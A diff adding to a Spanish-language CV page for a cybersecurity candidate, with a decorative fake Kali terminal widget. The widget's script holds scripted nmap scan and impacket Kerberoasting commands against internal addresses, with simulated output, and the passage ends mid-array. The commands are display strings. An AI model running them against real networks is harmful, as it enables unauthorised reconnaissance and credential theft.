+      <li>Documentación de hallazgos técnicos y recomendaciones de seguridad.</li>
+    </ul>
+  </div>
+
+  <div class="exp-item">
+    <div class="exp-header">
+      <div>
+        <div class="exp-title">Analista de Ciberseguridad</div>
+        <div class="exp-company"><a href="" target="_blank">NoCountry</a> | Proyecto Fintech</div>
+      </div>
+      <div class="exp-date">SEP–DIC 2025</div>
+    </div>
+    <ul class="exp-details">
+      <li>Análisis de vulnerabilidades en aplicaciones web en entorno fintech.</li>
+      <li>Uso de herramientas como OWASP ZAP para testing de seguridad.</li>
+      <li>Aplicación de buenas prácticas de seguridad en autenticación y cifrado.</li>
+      <li>Automatización de tareas de análisis con Python y Bash.</li>
+      <li>Documentación de hallazgos técnicos y recomendaciones de seguridad.</li>
+    </ul>
+  </div>
+
+  <div class="exp-item">
+    <div class="exp-header">
+      <div>
+        <div class="exp-title">Técnico de Sistemas (fines de semana)s</div>
+        <div class="exp-company"><a href="https://gruposermicro.com/" target="_blank">Sermicro</a></div>
+      </div>
+      <div class="exp-date">NOV–DIC 2023</div>
+    </div>
+    <ul class="exp-details">
+      <li>Soporte técnico a usuarios en entornos Windows y redes corporativas.</li>
+      <li>Administración básica de Active Directory y gestión de usuarios.</li>
+      <li>Instalación y configuración de sistemas y software corporativo.</li>
+      <li>Resolución de incidencias técnicas y gestión de tickets.</li>
+    </ul>
+  </div>
+
+  <div class="exp-item">
+    <div class="exp-header">
+      <div>
+        <div class="exp-title">Técnico de Sistemas</div>
+        <div class="exp-company"><a href="https://www.juntadeandalucia.es/" target="_blank">Red Guadalinfo</a> | Junta de Andalucía</div>
+      </div>
+      <div class="exp-date">ENE–MAY 2021</div>
+    </div>
+    <ul class="exp-details">
+      <li>Administración de sistemas Windows y Linux en entornos públicos.</li>
+      <li>Configuración de redes locales, DNS, DHCP y políticas de grupo.</li>
+      <li>Soporte técnico a usuarios y resolución de incidencias.</li>
+      <li>Mantenimiento de infraestructura de red en centros digitales.</li>
+    </ul>
+  </div>
+
+    <div class="exp-item">
+    <div class="exp-header">
+      <div>
+        <div class="exp-title">Proyectos Técnicos Personales</div>
+        <div class="exp-company"><a href="https://github.com/Zyanetralys" target="_blank">Portfolio</a></div>
+      </div>
+      <div class="exp-date">ENE–MAY 2021</div>
+    </div>
+    <ul class="exp-details">
+    <ul>
+      <li>Laboratorios en HackTheBox, TryHackMe, VulnHub y Blue Team Labs.</li>
+      <li>Resolución de CTFs en PicoCTF, OverTheWire y plataformas de seguridad.</li>
+      <li>Desarrollo de scripts y herramientas en Python, Java y Bash.</li>
+      <li>Automatización de procesos de análisis y pentesting.</li>
+      <li>Documentación técnica y proyectos publicados en GitHub.</li>
+    </ul>
+    </ul>
+  </div>
+  
+</section>
+
+<div class="divider">════════════════════════════════════════════════</div>
+
+<section>
+  <h2>FORMACIÓN</h2>
+  <div class="edu-item">
+    <div class="edu-title">Máster en Ciberseguridad</div>
+    <div class="edu-school"><a href="https://www.ucam.edu/" target="_blank">Universidad Católica San Antonio de Murcia</a></div>
+    <div class="edu-date">2025 | 1.500h • 60 ECTS</div>
+  </div>
+  <div class="edu-item">
+    <div class="edu-title">Máster en Big Data & Business Intelligence</div>
+    <div class="edu-school"><a href="https://www.ui1.es/" target="_blank">Universidad Isabel I</a></div>
+    <div class="edu-date">2025 | 1.800h • 72 ECTS</div>
+  </div>
+  <div class="edu-item">
+    <div class="edu-title">Máster en Dirección de Proyectos</div>
+    <div class="edu-school"><a href="https://www.ui1.es/" target="_blank">Universidad Isabel I</a></div>
+    <div class="edu-date">2025 | 1.500h • 60 ECTS</div>
+  </div>
+  <div class="edu-item">
+    <div class="edu-title">Grado Superior en ASIR</div>
+    <div class="edu-school"><a href="https://www.ilerna.es/" target="_blank">Ilerna</a></div>
+    <div class="edu-date">2025 | 2.000h • 120 ECTS</div>
+  </div>
+  <div class="edu-item">
+    <div class="edu-title">Grado Superior en DAM (Cursando)</div>
+    <div class="edu-school"><a href="https://www.ilerna.es/" target="_blank">Ilerna</a></div>
+  </div>
+  <div class="edu-item">
+    <div class="edu-title">Técnico en Ciberseguridad</div>
+    <div class="edu-school"><a href="https://www.incibe.es/" target="_blank">INCIBE</a></div>
+    <div class="edu-date">2024 | 250h</div>
+  </div>
+  <div class="edu-item">
+    <div class="edu-title">Grado en Sistemas Microinformáticos y Redes</div>
+    <div class="edu-school"><a href="https://www.ilerna.es/" target="_blank">Ilerna</a></div>
+    <div class="edu-date">2021 | 2.000h</div>
+  </div>
+</section>
+
+<div class="divider">════════════════════════════════════════════════</div>
+
+<section>
+  <h2>STACK TÉCNICO</h2>
+  <div class="skills-grid">
+    <div class="skill-cat">
+      <h3>SISTEMAS</h3>
+      <ul class="skill-list">
+        <li>Windows Server, AD, GPO, IIS</li>
+        <li>Linux: Kali, Ubuntu, Arch</li>
+        <li>VMware, VirtualBox</li>
+      </ul>
+    </div>
+    <div class="skill-cat">
+      <h3>REDES</h3>
+      <ul class="skill-list">
+        <li>TCP/IP, DNS, DHCP, VLANs</li>
+        <li>VPN, pfSense, OPNsense, IPFire</li>
+        <li>Firewalls, DMZ</li>
+      </ul>
+    </div>
+    <div class="skill-cat">
+      <h3>DESARROLLO</h3>
+      <ul class="skill-list">
+        <li>Python, Bash, PowerShell</li>
+        <li>Git, HTML/CSS, JS/TS, Java</li>
+        <li>SQL: PostgreSQL, MySQL</li>
+      </ul>
+    </div>
+    <div class="skill-cat">
+      <h3>SEGURIDAD</h3>
+      <ul class="skill-list">
+        <li>Nmap, Wireshark, OWASP ZAP, Metasploit</li>
+        <li>Hydra, JTR, Medusa, Ghidra, CyberChef</li>
+        <li>OSINT, Forensics, Hardening</li>
+        <li>ISO 27001, ENS, RGPD</li>
+      </ul>
+    </div>
+    <div class="skill-cat">
+      <h3>HERRAMIENTAS</h3>
+      <ul class="skill-list">
+        <li>Jira, Confluence, NinjaOne RMM</li>
+        <li>HTB, TryHackMe, VulnHub</li>
+        <li>Docker, Azure (AZ-204)</li>
+      </ul>
+    </div>
+  </div>
+  <p style="margin-top:0.7rem;font-size:0.75rem;color:var(--text-dim);">
+    <span class="tag">+100 CERTS</span> disponibles bajo demanda
+  </p>
+</section>
+
+<div class="divider">════════════════════════════════════════════════</div>
+
+<section>
+  <h2>CERTIFICACIONES — CIBERSEGURIDAD</h2>
+  <div class="cert-grid">
+    <div class="cert-item"><strong>ISO 27001:2022</strong> Lead Auditor</div>
+    <div class="cert-item"><strong>ISO 27001:2022</strong> Security Associate</div>
+    <div class="cert-item"><strong>CTIGA</strong> Threat Intelligence</div>
+    <div class="cert-item"><strong>C-OSIA</strong> OSINT Analyst</div>
+    <div class="cert-item"><strong>CRPO</strong> Ransomware Protection</div>
+    <div class="cert-item"><strong>CSCSO</strong> SME Cyber Security Officer</div>
+    <div class="cert-item"><strong>CCSC</strong> Cybersecurity Career Starter</div>
+    <div class="cert-item"><strong>OSForensics</strong> Triage</div>
+    <div class="cert-item"><strong>CyberSOC N1</strong> Resility</div>
+    <div class="cert-item"><strong>Threat Hunting</strong> Resility</div>
+    <div class="cert-item"><strong>SOC 101</strong> Operaciones Seguridad</div>
+    <div class="cert-item"><strong>ICS300</strong> Industrial Control Systems</div>
+    <div class="cert-item"><strong>PMJ</strong> Ethical Hacking</div>
+    <div class="cert-item"><strong>Pentesting Pro</strong> HackerMentor</div>
+    <div class="cert-item"><strong>Pentesting 101</strong> 8dot8</div>
+    <div class="cert-item"><strong>Bug Bounty</strong> LionxSecurity</div>
+    <div class="cert-item"><strong>Ethical Hacker</strong> Cisco</div>
+    <div class="cert-item"><strong>NDE</strong> EC-Council</div>
+    <div class="cert-item"><strong>SQL Injection</strong> EC-Council</div>
+    <div class="cert-item"><strong>XSS Defenses</strong> Linux Foundation</div>
+    <div class="cert-item"><strong>Cybersecurity Essentials</strong> Linux Foundation</div>
+    <div class="cert-item"><strong>Auditoría Ciberseguridad</strong> 8dot8</div>
+    <div class="cert-item"><strong>Fundamentos CISO</strong> 8dot8</div>
+    <div class="cert-item"><strong>Linux 101</strong> 8dot8</div>
+    <div class="cert-item"><strong>Kali Linux 101</strong> Academia Ciberseguridad</div>
+    <div class="cert-item"><strong>Linux Unhatched</strong> Cisco</div>
+    <div class="cert-item"><strong>Bash Pentesting</strong> LinkedIn Learning</div>
+    <div class="cert-item"><strong>Bash Scripting</strong> DevOps Bootcamp</div>
+    <div class="cert-item"><strong>Deep Web & Darknet</strong> Enhacke/ExorciseThat</div>
+    <div class="cert-item"><strong>C1b3rwall CNP</strong> 2023, 2025</div>
+    <div class="cert-item"><strong>Cisco Switching CCNP</strong> Min. Interior</div>
+    <div class="cert-item"><strong>Protección Dispositivos Red</strong> Adams</div>
+    <div class="cert-item"><strong>Soporte IT Profesional</strong> Fundae</div>
+    <div class="cert-item"><strong>Protección de Datos</strong> Resility/IBM/Hermes</div>
+  </div>
+</section>
+
+<section>
+  <h2>CERTIFICACIONES — DESARROLLO & CLOUD</h2>
+  <div class="cert-grid">
+    <div class="cert-item"><strong>AZ-204</strong> Azure Bootcamp</div>
+    <div class="cert-item"><strong>Python Backend</strong> IBM (Flask, Django)</div>
+    <div class="cert-item"><strong>Python Profesional</strong> Código Facilito/IBM</div>
+    <div class="cert-item"><strong>Django Masterclass</strong> Código Facilito</div>
+    <div class="cert-item"><strong>Flask</strong> IBM</div>
+    <div class="cert-item"><strong>PHP & MySQL</strong> Euroformac</div>
+    <div class="cert-item"><strong>Docker</strong> Código Facilito</div>
+    <div class="cert-item"><strong>Git</strong> Código Facilito</div>
+    <div class="cert-item"><strong>Front-End Web</strong> Smartmind</div>
+    <div class="cert-item"><strong>Apps Móviles</strong> UCM</div>
+    <div class="cert-item"><strong>Full Stack Data Science</strong> TPoint</div>
+    <div class="cert-item"><strong>Ciencia de Datos</strong> Código Facilito</div>
+    <div class="cert-item"><strong>Administración Sistemas IT</strong> Fundae</div>
+  </div>
+</section>
+
+<section>
+  <h2>CERTIFICACIONES — GESTIÓN & OTROS</h2>
+  <div class="cert-grid">
+    <div class="cert-item"><strong>PMI</strong> Gestión Proyectos/Programas</div>
+    <div class="cert-item"><strong>Six Sigma</strong> Green Belt</div>
+    <div class="cert-item"><strong>SLA IT</strong> LinkedIn Learning</div>
+    <div class="cert-item"><strong>IT Recruitment TOP Scorer 2025</strong> Editx</div>
+    <div class="cert-item"><strong>Piloto Dron UAS A1/A3</strong> AESA</div>
+    <div class="cert-item"><strong>Técnico Protección Civil</strong> UCJC (425h)</div>
+    <div class="cert-item"><strong>Psicología del Deporte</strong> COI</div>
+    <div class="cert-item"><strong>Psicólogo Crisis y Emergencias</strong> UCJC</div>
+    <div class="cert-item"><strong>Coaching Ejecutivo</strong> Udemy/EBS</div>
+    <div class="cert-item"><strong>PNL Master Practitioner</strong> iGNLP</div>
+  </div>
+</section>
+
+<div class="divider">════════════════════════════════════════════════</div>
+
+<section>
+  <h2>LABORATORIOS & COMUNIDADES</h2>
+  <ul class="projects-list">
+    <li><strong>GitHub:</strong> Zyanetralys — Python, automatización, pentesting, Java, SQL</li>
+    <li><strong>Blue Team:</strong> Let'sDefend, CyberDefenders, SOC 101</li>
+    <li><strong>CTF/Pentesting:</strong> HackTheBox, TryHackMe, VulnHub, PicoCTF, OverTheWire, Root-Me</li>
+    <li><strong>Comunidades:</strong> XSec, C1b3rwall, DragonJAR, UnderC0de, Women IT, CyberRangers</li>
+  </ul>
+</section>
+
+<section>
+  <h2>DISPONIBILIDAD</h2>
+  <div class="availability">
+    <span>[+]</span> REMOTO / HÍBRIDO / PRESENCIAL &nbsp;&nbsp;
+    <span>[+]</span> MADRID / CÁDIZ / MOVILIDAD NACIONAL &nbsp;&nbsp;
+    <span>[+]</span> INCORPORACIÓN INMEDIATA
+  </div>
+</section>
+
+<footer>
+</footer>
+
+<!-- BOTÓN DE AUDIO (Estilo Cyberpunk) -->
+<div style="text-align:center; margin-top:1rem;">
+  <button class="audio-btn" id="audioBtn" onmouseenter="setLightsaberMode('blue')" onmouseleave="setLightsaberMode('green')" onclick="toggleAudio()">[ 🔇 AMBIENT SOUND ]</button>
+</div>
+
+<!-- VIDEO OCULTO (Solo Audio) - AUTOPLAY CON SONIDO -->
+<div class="audio-hidden">
+  <iframe 
+    id="ytAudio"
+    src="https://www.youtube.com/embed/EZbF76GxsN8?autoplay=1&mute=0&controls=0&modestbranding=1&loop=1&playlist=EZbF76GxsN8&enablejsapi=1" 
+    title="Background Audio"
+    allow="autoplay; encrypted-media">
+  </iframe>
+</div>
+
+<script>
+  let isMuted = true;
+  
+  function toggleAudio() {
+    const btn = document.getElementById('audioBtn');
+    const iframe = document.getElementById('ytAudio');
+    
+    if (isMuted) {
+      iframe.src = iframe.src.replace('mute=1', 'mute=0');
+      btn.innerHTML = '[ 🔊 SOUND: ON ]';
+      btn.style.animation = 'pulse 1s infinite';
+      isMuted = false;
+    } else {
+      iframe.src = iframe.src.replace('mute=0', 'mute=1');
+      btn.innerHTML = '[ 🔇 AMBIENT SOUND ]';
+      btn.style.animation = 'none';
+      isMuted = true;
+    }
+  }
+
+  // --- LIGHTSABER CURSOR SCRIPT ---
+  const lightsaber = document.getElementById('lightsaber');
+  let currentMode = 'green';
+  
+  // Función para cambiar entre modo verde y azul
+  function setLightsaberMode(mode) {
+    if (mode !== currentMode) {
+      lightsaber.classList.remove(currentMode);
+      lightsaber.classList.add(mode);
+      currentMode = mode;
+    }
+  }
+  
+  if (lightsaber && window.matchMedia('(hover: hover) and (pointer: fine)').matches) {
+    // Detectar todos los elementos cliqueables
+    const clickableElements = document.querySelectorAll('a, button, .audio-btn, .cert-item, .skill-cat, .exp-item, .edu-item');
+    
+    // Añadir eventos a todos los elementos cliqueables
+    clickableElements.forEach(el => {
+      el.addEventListener('mouseenter', () => setLightsaberMode('blue'));
+      el.addEventListener('mouseleave', () => setLightsaberMode('green'));
+    });
+
+    // Movimiento del cursor - la punta sigue exactamente el ratón
+    document.addEventListener('mousemove', (e) => {
+      lightsaber.style.left = e.clientX + 'px';
+      lightsaber.style.top = e.clientY + 'px';
+    });
+
+    // Efecto al hacer click (la punta se intensifica)
+    document.addEventListener('mousedown', () => {
+      if (currentMode === 'green') {
+        lightsaber.style.filter = 'drop-shadow(0 0 18px rgba(0,255,65,1)) drop-shadow(0 0 36px rgba(0,255,65,0.8)) drop-shadow(0 0 54px rgba(0,255,65,0.6))';
+        lightsaber.style.transform = 'translate(-40%, -8%) rotate(-52deg)';
+      } else {
+        lightsaber.style.filter = 'drop-shadow(0 0 20px rgba(0,150,255,1)) drop-shadow(0 0 40px rgba(0,150,255,0.8)) drop-shadow(0 0 60px rgba(0,150,255,0.6))';
+        lightsaber.style.transform = 'translate(-40%, -8%) rotate(-52deg)';
+      }
+    });
+
+    document.addEventListener('mouseup', () => {
+      if (currentMode === 'green') {
+        lightsaber.style.filter = 'drop-shadow(0 0 8px rgba(0,255,65,0.8)) drop-shadow(0 0 16px rgba(0,255,65,0.6)) drop-shadow(0 0 24px rgba(0,255,65,0.4))';
+        lightsaber.style.transform = 'translate(-40%, -8%) rotate(-45deg)';
+      } else {
+        lightsaber.style.filter = 'drop-shadow(0 0 10px rgba(0,150,255,0.9)) drop-shadow(0 0 20px rgba(0,150,255,0.7)) drop-shadow(0 0 30px rgba(0,150,255,0.5))';
+        lightsaber.style.transform = 'translate(-40%, -8%) rotate(-45deg)';
+      }
+    });
+  }
+</script>
+
+
+  <!-- CYBER TERMINAL WIDGET - ENHANCED PRO EDITION v2.1 -->
+<!-- CYBER TERMINAL - KALI OPS CORE v4.0 -->
+<!-- Reemplaza SOLO el bloque terminal. CV intacto. -->
+<div id="kali-terminal" class="ops-core">
+  <div class="term-header">
+    <span class="prompt-id">kali@zyanetralys:~/ops/pentest</span>
+    <div class="term-meta">
+      <span class="meta threat" id="threat">THREAT:<b>LOW</b></span>
+      <span class="meta">PID:<b id="pid">8842</b></span>
+      <span class="meta">MEM:<b id="mem">142MB</b></span>
+      <span class="meta">CPU:<b id="cpu">12%</b></span>
+      <button class="ctrl" id="minBtn" title="Minimizar">_</button>
+      <button class="ctrl" id="closeBtn" title="Ocultar">×</button>
+    </div>
+  </div>
+  
+  <div class="term-body">
+    <!-- Scanline + noise overlays -->
+    <div class="scanline"></div>
+    <div class="noise"></div>
+    
+    <!-- Terminal output -->
+    <div class="output" id="output"></div>
+    
+    <!-- Input line -->
+    <div class="input-line">
+      <span class="prompt">└─$</span>
+      <span id="cmdBuffer"></span>
+      <span class="cursor" id="cursor">█</span>
+    </div>
+    
+    <!-- Tiny wolf in corner -->
+    <div class="wolf-corner" id="wolfCorner" title="Ops Monitor">
+      <svg viewBox="0 0 40 40" width="28" height="28">
+        <defs>
+          <linearGradient id="wGrad" x1="0%" y1="0%" x2="100%" y2="100%">
+            <stop offset="0%" stop-color="#00f5ff"/><stop offset="100%" stop-color="#005566"/>
+          </linearGradient>
+          <filter id="wGlow"><feGaussianBlur stdDeviation="1.2"/></filter>
+        </defs>
+        <!-- Wolf head silhouette -->
+        <path d="M8,28 C8,18 14,12 20,12 C26,12 32,18 32,28 C32,32 28,36 20,36 C12,36 8,32 8,28 Z" fill="none" stroke="url(#wGrad)" stroke-width="1.2" opacity="0.9"/>
+        <!-- Ears -->
+        <path d="M10,20 L8,12 L14,18 Z" fill="url(#wGrad)" opacity="0.7"/>
+        <path d="M30,20 L32,12 L26,18 Z" fill="url(#wGrad)" opacity="0.7"/>
+        <!-- Eyes -->
+        <circle cx="16" cy="24" r="2" fill="#00f5ff" class="eye" filter="url(#wGlow)"/>
+        <circle cx="24" cy="24" r="2" fill="#00f5ff" class="eye" filter="url(#wGlow)"/>
+        <!-- Nose -->
+        <circle cx="20" cy="29" r="1.5" fill="#00f5ff" opacity="0.8"/>
+        <!-- Status pulse ring -->
+        <circle cx="20" cy="24" r="14" fill="none" stroke="#00f5ff" stroke-width="0.6" stroke-dasharray="3 4" opacity="0.3" class="pulse-ring">
+          <animateTransform attributeName="transform" type="rotate" from="0 20 24" to="360 20 24" dur="12s" repeatCount="indefinite"/>
+        </circle>
+      </svg>
+      <span class="wolf-dot" id="wolfDot"></span>
+    </div>
+  </div>
+  
+  <!-- Alert ticker -->
+  <div class="alert-ticker" id="alertTicker"></div>
+  
+  <!-- Quick command palette -->
+  <div class="cmd-palette" id="cmdPalette">
+    <button data-cmd="scan">⚡</button>
+    <button data-cmd="exploit">☠</button>
+    <button data-cmd="enum">🔍</button>
+    <button data-cmd="exfil">📤</button>
+    <button data-cmd="stealth">👁</button>
+  </div>
+</div>
+
+<!-- Popup layer for notifications -->
+<div id="popup-layer"></div>
+
+<style>
+:root{
+  --bg:#010205;--term:#02040a;--border:#0a1428;
+  --cyan:#00f5ff;--cyan-dim:#00a8cc;--cyan-glow:0 0 6px rgba(0,245,255,0.5);
+  --green:#00ff41;--warn:#ff3355;--alert:#ff00aa;--ok:#bfff00;
+  --text:#c5d1e6;--text-dim:#5a6a85;--mono:'JetBrains Mono','Fira Code',monospace;
+}
+
+.ops-core{
+  position:fixed;bottom:55px;right:18px;z-index:99999;
+  font-family:var(--mono);background:var(--bg);
+  border:1px solid var(--border);border-radius:6px;
+  overflow:hidden;box-shadow:0 6px 24px rgba(0,0,0,0.8),var(--cyan-glow);
+  width:360px;transition:all .25s cubic-bezier(.4,0,.2,1);
+  opacity:0;transform:translateY(10px);cursor:default;
+  border-left:2px solid var(--cyan);
+}
+.ops-core.visible{opacity:1;transform:translateY(0)}
+.ops-core.min{width:44px;height:44px;border-radius:22px}
+.ops-core.min .term-body,.ops-core.min .alert-ticker,.ops-core.min .cmd-palette{display:none}
+.ops-core.hidden{opacity:0;pointer-events:none;transform:translateY(50px)}
+.ops-core.threat-high{border-left-color:var(--warn);box-shadow:0 6px 24px rgba(0,0,0,0.9),0 0 12px rgba(255,51,85,0.4)}
+.ops-core.threat-crit{border-left-color:var(--alert);box-shadow:0 6px 24px rgba(0,0,0,0.95),0 0 16px rgba(255,0,170,0.5)}
+
+.term-header{
+  display:flex;justify-content:space-between;align-items:center;
+  padding:4px 7px;background:linear-gradient(90deg,rgba(0,245,255,.08),transparent);
+  border-bottom:1px solid var(--border);font-size:7px;color:var(--text-dim);
+}
+.prompt-id{color:var(--cyan);font-weight:700;letter-spacing:.5px;text-shadow:var(--cyan-glow)}
+.term-meta{display:flex;align-items:center;gap:4px;flex-wrap:wrap}
+.meta{opacity:.85;font-size:6.5px}
+.meta.b{color:var(--text)}
+.meta.threat b{color:var(--green)}
+.ctrl{
+  width:13px;height:13px;display:flex;align-items:center;justify-content:center;
+  background:transparent;border:none;color:var(--text-dim);cursor:pointer;
+  font-size:10px;line-height:1;border-radius:2px;transition:all .12s;
+}
+.ctrl:hover{color:var(--cyan);background:rgba(0,245,255,.12);box-shadow:var(--cyan-glow)}
+#closeBtn:hover{color:var(--warn);background:rgba(255,51,85,.18)}
+
+.term-body{position:relative;padding:5px;background:var(--term);min-height:95px}
+
+.scanline{
+  position:absolute;inset:0;background:linear-gradient(180deg,transparent 48%,rgba(0,245,255,.06) 50%,transparent 52%);
+  animation:scan 3.8s linear infinite;pointer-events:none;z-index:1;opacity:.4;
+}
+@keyframes scan{0%{transform:translateY(-100%)}100%{transform:translateY(100%)}}
+.noise{
+  position:absolute;inset:0;pointer-events:none;z-index:1;opacity:.04;
+  background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='64' height='64'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.85'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
+}
+
+.output{
+  height:88px;overflow-y:auto;font-size:7px;line-height:1.25;
+  color:var(--text-dim);scrollbar-width:none;position:relative;z-index:2;
+  padding:2px 4px;white-space:pre-wrap;word-break:break-all;
+}
+.output::-webkit-scrollbar{display:none}
+.line{opacity:0;transform:translateX(-2px);transition:opacity .08s,transform .08s}
+.line.show{opacity:1;transform:translateX(0)}
+.line.ok{color:var(--ok)}
+.line.warn{color:var(--warn)}
+.line.info{color:var(--cyan-dim)}
+.line.crit{color:var(--alert);font-weight:600;text-shadow:0 0 4px rgba(255,0,170,.4)}
+
+.input-line{
+  display:flex;align-items:center;gap:3px;padding:3px 4px;
+  border-top:1px solid var(--border);background:rgba(0,245,255,.02);
+  font-size:7px;min-height:15px;position:relative;z-index:2;
+}
+.prompt{color:var(--green);font-weight:700}
+.cursor{animation:blink .9s step-end infinite;color:var(--cyan);text-shadow:var(--cyan-glow)}
+@keyframes blink{0%,49%{opacity:1}50%,100%{opacity:.25}}
+
+.wolf-corner{
+  position:absolute;bottom:6px;right:6px;z-index:3;display:flex;align-items:center;gap:2px;
+  cursor:crosshair;transition:transform .15s;
+}
+.wolf-corner:hover{transform:scale(1.1)}
+.wolf-corner svg{display:block;filter:drop-shadow(0 0 3px rgba(0,245,255,0.4))}
+.wolf-corner .eye{transition:fill .2s}
+.ops-core.threat-high .wolf-corner .eye{fill:#ff4444}
+.ops-core.threat-crit .wolf-corner .eye{fill:#ff00ff;animation:pulseEye .7s infinite}
+@keyframes pulseEye{0%,100%{opacity:1}50%{opacity:.6}}
+.wolf-dot{width:3px;height:3px;background:var(--green);border-radius:50%;animation:blinkPulse 1.4s infinite}
+@keyframes blinkPulse{0%,100%{opacity:1;box-shadow:0 0 4px var(--green)}50%{opacity:.5}}
+
+.alert-ticker{
+  font-size:6px;padding:3px 5px;background:rgba(2,4,10,.95);
+  border-top:1px dashed var(--border);color:var(--text-dim);
+  overflow:hidden;white-space:nowrap;text-overflow:ellipsis;
+  height:18px;display:flex;align-items:center;gap:4px;
+}
+.alert-ticker::before{content:'▸';color:var(--cyan);animation:blink .8s infinite}
+.alert-ticker.high{color:var(--warn)}
+.alert-ticker.crit{color:var(--alert);animation:pulseAlert 1.1s infinite}
+@keyframes pulseAlert{0%,100%{opacity:1}50%{opacity:.7}}
+
+.cmd-palette{
+  position:absolute;bottom:-32px;left:50%;transform:translateX(-50%);
+  display:flex;gap:2px;padding:3px 5px;background:rgba(2,4,10,.98);
+  border:1px solid var(--border);border-radius:5px;box-shadow:0 3px 12px rgba(0,0,0,.6);
+  opacity:0;transition:opacity .18s,transform .18s;pointer-events:none;z-index:10;
+}
+.ops-core:hover .cmd-palette{opacity:1;transform:translateX(-50%) translateY(-4px);pointer-events:auto}
+.cmd-palette button{
+  width:24px;height:20px;display:flex;align-items:center;justify-content:center;
+  background:var(--term);border:1px solid var(--border);border-radius:3px;
+  color:var(--cyan);font-size:9px;cursor:pointer;transition:all .12s;font-family:var(--mono);
+}
+.cmd-palette button:hover{
+  background:rgba(0,245,255,.15);border-color:var(--cyan);
+  box-shadow:var(--cyan-glow);color:#fff;transform:translateY(-1px);
+}
+
+/* POPUP NOTIFICATIONS */
+#popup-layer{
+  position:fixed;top:85px;right:20px;z-index:100000;
+  display:flex;flex-direction:column;gap:4px;pointer-events:none;max-width:260px;
+}
+.popup{
+  background:rgba(2,4,10,.98);border:1px solid var(--border);border-left:3px solid var(--cyan);
+  color:var(--text);padding:5px 6px;border-radius:4px;
+  box-shadow:0 4px 14px rgba(0,0,0,.6),var(--cyan-glow);
+  transform:translateX(120%);transition:transform .18s cubic-bezier(.4,0,.2,1);
+  font-size:6.8px;line-height:1.2;backdrop-filter:blur(8px);position:relative;overflow:hidden;
+}
+.popup.show{transform:translateX(0)}
+.popup.warn{border-left-color:var(--warn);box-shadow:0 4px 14px rgba(0,0,0,.6),0 0 10px rgba(255,51,85,0.4)}
+.popup.crit{border-left-color:var(--alert);animation:pulsePopup 1s infinite}
+@keyframes pulsePopup{0%,100%{box-shadow:0 4px 14px rgba(0,0,0,.6),0 0 10px rgba(255,51,85,0.4)}50%{box-shadow:0 4px 20px rgba(255,0,170,0.6)}}
+.popup .p-title{font-weight:700;display:block;margin-bottom:1px;color:var(--cyan)}
+.popup.warn .p-title{color:var(--warn)}
+.popup.crit .p-title{color:var(--alert)}
+.popup .p-desc{color:var(--text-dim);font-size:6.5px;opacity:.95;display:block}
+.popup .p-meta{color:var(--text-muted);font-size:5.5px;margin-top:1px;font-style:italic;opacity:.8}
+.popup::before{
+  content:'';position:absolute;top:0;right:0;width:3px;height:100%;
+  background:linear-gradient(180deg,var(--cyan),transparent);
+  animation:flashBar 1.1s infinite;opacity:.8;
+}
+.popup.warn::before{background:linear-gradient(180deg,var(--warn),transparent)}
+.popup.crit::before{background:linear-gradient(180deg,var(--alert),var(--cyan))}
+@keyframes flashBar{0%,100%{opacity:.8}50%{opacity:1}}
+
+/* Responsive */
+@media(max-width:1024px){.ops-core{width:330px;bottom:50px;right:14px}#popup-layer{right:16px}}
+@media(max-width:768px){.ops-core{display:none}}
+</style>
+
+<script>
+(()=>{
+  const $=id=>document.getElementById(id);
+  if(!$('kali-terminal'))return;
+  
+  const core=$('kali-terminal'),out=$('output'),cmdBuf=$('cmdBuffer'),
+        cursor=$('cursor'),ticker=$('alertTicker'),wolf=$('wolfCorner'),wolfDot=$('wolfDot'),
+        threat=$('threat').querySelector('b'),pid=$('pid'),mem=$('mem'),cpu=$('cpu'),
+        popupLayer=$('popup-layer');
+
+  // Controls
+  $('minBtn').onclick=e=>{e.stopPropagation();core.classList.toggle('min')};
+  $('closeBtn').onclick=e=>{e.stopPropagation();core.classList.add('hidden')};
+  core.onclick=e=>{if(e.target.closest('.ctrl'))return;core.classList.contains('hidden')&&core.classList.remove('hidden');core.classList.contains('min')&&core.classList.remove('min')};
+
+  // Utils
+  const delay=ms=>new Promise(r=>setTimeout(r,ms));
+  const rnd=(a,b)=>Math.floor(Math.random()*(b-a+1)+a);
+  const pick=arr=>arr[rnd(0,arr.length-1)];
+  const ts=()=>new Date().toISOString().split('T')[1].split('.')[0];
+  const fmtTS=()=>new Date().toLocaleTimeString('es-ES',{hour12:false});
+  
+  let running=true,busy=false,turbo=false,threatLvl='low',sess=0,alertCnt=0;
+
+  // === AUTHENTIC KALI/PENTEST COMMANDS + OUTPUT ===
+  const ops=[
+    {cmd:"nmap -sS -sV -sC -O -T4 -p- --min-rate 4000 10.12.0.10/24",lines:[
+      `Starting Nmap 7.94SVN ( https://nmap.org ) at ${ts()} CET`,
+      'Nmap scan report for dc01.corp.local (10.12.0.10)','Host is up (0.0012s latency).',
+      'Not shown: 989 filtered tcp ports (no-response)','PORT     STATE SERVICE       VERSION',
+      '53/tcp   open  domain        Microsoft DNS 10.0.20348',
+      '88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: '+ts()+'Z)',
+      '135/tcp  open  msrpc         Microsoft Windows RPC',
+      '389/tcp  open  ldap          Microsoft Windows Active Directory LDAP',
+      '445/tcp  open  microsoft-ds  Windows Server 2022 Standard 20348',
+      '636/tcp  open  ldapssl       Microsoft Windows Active Directory LDAP',
+      '3268/tcp open  globalcatLDAP Microsoft Windows Active Directory LDAP',
+      '5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)',
+      'Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows_server_2022',
+      'OS details: Windows Server 2022','Network Distance: 1 hop',
+      `Nmap done: 256 IP addresses (18 hosts up) scanned in ${rnd(42,68)}.3 seconds`
+    ],sev:'ok',popup:{t:'[NMAP] SCAN COMPLETE',d:'18 hosts up, 11 services mapped',meta:'Target: 10.12.0.10/24'}},
+    
+    {cmd:"impacket-GetUserSPNs -dc-ip 10.12.0.10 corp.local/svc_enum -request",lines:[
+      'Impacket v0.12.0 - Copyright Fortra, LLC','[*] Authenticating as svc_enum@corp.local',
+      '[*] Getting TGT for svc_enum','[*] Target SPN: MSSQLSvc/dc01.corp.local:1433',
